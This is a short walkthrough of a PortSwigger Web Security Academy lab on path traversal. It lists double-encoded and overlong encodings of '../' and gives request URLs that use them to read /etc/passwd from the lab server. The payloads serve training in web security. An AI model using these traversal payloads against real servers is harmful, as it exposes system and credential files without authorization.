# [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

> detailed document about path traversal [here](?file=portswigger%2Fbasic%2Fpath-traversal)

> workaround for the url encoded path

- best options `%2e%2e%2f` or `..%c0%af` or `..%252f` or `%252e%252e%252f` or `..%ef%bc%8f` = `../`

- open a product image in a new tab:

`https://xxx.web-security-academy.net/image?filename=44.jpg`

- change the filename value to

`https://xxx.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`

or

`https://xxx.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd`

- check the response and change the view it to utf-8, it will have the content of a passwd file
